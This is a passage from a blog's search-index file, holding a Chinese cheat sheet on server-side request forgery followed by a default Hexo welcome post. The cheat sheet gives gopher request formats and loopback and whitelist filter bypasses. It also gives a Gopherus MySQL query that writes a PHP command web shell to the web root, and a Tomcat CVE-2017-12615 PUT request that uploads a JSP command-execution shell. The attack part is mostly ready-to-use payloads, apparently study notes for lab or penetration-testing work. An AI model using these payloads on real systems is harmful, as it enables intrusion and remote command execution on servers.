plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gopher">GET提交<br>gopher://172.250.250.4:80/_GET /name.php?name=test HTTP/1.1<br>Host: 172.250.250.4<br><br>POST提交需要保留头部信息:<br>POST<br>Host:<br>Content-Type:<br>Content-Length:<br><br>eg:<br>url=gopher://172.250.250.4:80/_POST /name.php HTTP/1.1<br>Host: 172.250.250.4<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 9<br><br>name=test<br></code></pre></td></tr></table></figure><p>注意事项：<br><code>?</code>需要URL编码<br>回车换行要变为%0d%0a，直接工具可能是%0a<br>HTTP包最后要加%0d%0a<br>burp发包需要url编码两次</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="环回地址绕过"><a href="#环回地址绕过" class="headerlink" title="环回地址绕过"></a>环回地址绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/bin/bash</span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>hex_ip=$(printf <span class="hljs-string">&#x27;%02x&#x27;</span> $&#123;ip<span class="hljs-comment">//./ &#125;)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hex_ip</span><br></code></pre></td></tr></table></figure><p>得到<code>127.0.0.1</code>的16进制是<code>0x7f000001</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>八进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><span class="hljs-regexp">/flag.php  点分式  http:/</span><span class="hljs-regexp">/0177.0000.0000.0001/</span>flag.php<br>十六进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F000001<span class="hljs-regexp">/flag.php    点分式  http:/</span><span class="hljs-regexp">/0x7F.0x00.0x00.0x01/</span>flag.php<br>十进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">当有的对跳转的地址的长度有要求<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br>host&lt;3<br>url=http://0/flag.php<br></code></pre></td></tr></table></figure><h3 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h3><figure class="highlight php"><figcaption><span>file:index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>php -S 0.0.0.0:1234</code></p><p>使用<code>https://tinyurl.com</code>生成302跳转地址(<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/</a>)</p><h3 id="DNS重绑定绕过"><a href="#DNS重绑定绕过" class="headerlink" title="DNS重绑定绕过"></a>DNS重绑定绕过</h3><p>原理：服务器两次解析同一域名的短暂间隙，更换域名背后的ip，达到突破同源策略或过WAF进行SSRF的目的<br>DNS中的机制TTL：域名和IP绑定关系的Cache存活的最长时间。<br>某些情况下，可以对同一个域名设置两个记录（一个内网、一个外网），随机访问一个，概率成功</p><p><code>https://lock.cmpxchg8b.com/rebinder.html</code><br><code>http://7f000001.c0a80001.rbndr.us/flag.php</code></p><h3 id="域名绕过"><a href="#域名绕过" class="headerlink" title="域名绕过"></a>域名绕过</h3><p>限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名<br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code></p><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">当不允许ip为内网地址时<br>（<span class="hljs-number">1</span>）采取短网址绕过  https://<span class="hljs-number">0</span>x9.me/cuGfD    <br>推荐：http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/<br>（<span class="hljs-number">2</span>）采取特殊域名<br>（<span class="hljs-number">3</span>）采取进制转换<br><br>白名单，一定要请求某个IP或域名的情况，这个时候在url后面跟上@符号，浏览器会访问@后面的域名或ip eg:http://abc.com@<span class="hljs-number">127.0.0.1</span><br>句号绕过         <span class="hljs-number">127。0。0。1</span> &gt;&gt;&gt; <span class="hljs-number">127.0.0.1</span><br>利用[::]绕过         http://[::]:<span class="hljs-number">80</span>/ &gt;&gt;&gt; http://<span class="hljs-number">127.0.0.1</span><br><br><br>可以指向任意ip的域名　 <br>xip.io     <br>[xip.io](http://xip.io/)<br>[xip.io<span class="hljs-number">127.0.0.1</span>.xip.io](http://xip.io<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[www.<span class="hljs-number">127.0.0.1</span>.xip.io](http://www.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[Haha.<span class="hljs-number">127.0.0.1</span>.xip.io](http://haha.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[Haha.xixi.<span class="hljs-number">127.0.0.1</span>.xip.io](http://haha.xixi.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>原理是DNS解析。xip.io可以指向任意域名，即<span class="hljs-number">127.0.0.1</span>.xip.io，可解析为<span class="hljs-number">127.0.0.1</span><br><br></code></pre></td></tr></table></figure><h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="对MySQL进行未授权查询"><a href="#对MySQL进行未授权查询" class="headerlink" title="对MySQL进行未授权查询"></a>对MySQL进行未授权查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump -i lo port 3306 -w mysql.pcapng<br><span class="hljs-comment">#-w 写文件，在根目录下</span><br>mysql -h127.0.0.1 -uroot --ssl-mode=DISABLED -e <span class="hljs-string">&quot;show databases;&quot;</span><br>show databases;<br></code></pre></td></tr></table></figure><p>将抓取的文件复制到本地，Wireshark打开，跟踪TCP流，筛选目标端口3306，show data as raw data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">5b0000000a352e352e352d31302e31312e322d4d6172696144422d3100210000006e673b2e72767b2700fef72d0200ff81150000000000001d0000004b24702e2e3c243f4f502669006d7973716c5f6e61746976655f70617373776f726400<br>bb00000184a2bf000000000121000000000000000000000000000000000000001d000000726f6f7400006d7973716c5f6e61746976655f70617373776f7264007e035f6f73054c696e75780c5f636c69656e745f6e616d650a6c69626d617269616462045f7069640531323339390f5f636c69656e745f76657273696f6e05332e332e34095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c0c5f7365727665725f686f7374093132372e302e302e31<br>32000002ffa2062332383030304163636573732064656e69656420666f7220757365722027726f6f742740276c6f63616c686f737427<br></code></pre></td></tr></table></figure><p>复制数据去掉换行，ASCII转URL编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    s=sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(results(s))<br></code></pre></td></tr></table></figure><p>复制，更改对应IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/tarunkant/Gopherus<br>python2.7 gopherus.py --exploit mysql<br>会输出：<br>Give MYSQL username:<br>Give query to execute:<br></code></pre></td></tr></table></figure><h3 id="对MySQL未授权文件写入"><a href="#对MySQL未授权文件写入" class="headerlink" title="对MySQL未授权文件写入"></a>对MySQL未授权文件写入</h3><p>查看写入权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2.7 gopherus.py --exploit mysql<br>Give MYSQL username:  root<br>Give query to execute:  show variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>secure_file_priv</code>后面为空则可写入<br>使用into outfile生成cmd.php写入一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2.7 gopherus.py --exploit mysql<br>Give MYSQL username:  root<br>Give query to execute:  <span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="hljs-string">&#x27;/var/www/html/cmd.php&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="对tomcat文件写入"><a href="#对tomcat文件写入" class="headerlink" title="对tomcat文件写入"></a>对tomcat文件写入</h3><p>利用Tomcat漏洞，CVE-2017-12615进行任意文件上传</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jsp">PUT /<span class="hljs-number">1.</span>jsp/ HTTP/<span class="hljs-number">1.1</span><br>HOST: ip:<span class="hljs-number">8080</span><br>Accetp: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: en</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Content-Length: 532</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;%</span><br><span class="hljs-comment">    String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="hljs-comment">    if(command!=null)&#123;</span><br><span class="hljs-comment">        java.io.InputStream</span><br><span class="hljs-comment">        in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="hljs-comment">        int a=-1;</span><br><span class="hljs-comment">        byte[] b= new byte[2048];</span><br><span class="hljs-comment">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="hljs-comment">        while((a=in.read(b))!=-1)&#123;</span><br><span class="hljs-comment">            out.println(new String(b));</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    else&#123;</span><br><span class="hljs-comment">         out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">%&gt;</span><br></code></pre></td></tr></table></figure><p>利用gopher，然后burp两次URL编码后提交</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/03/22/hello-world/"/>
    <url>/2025/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
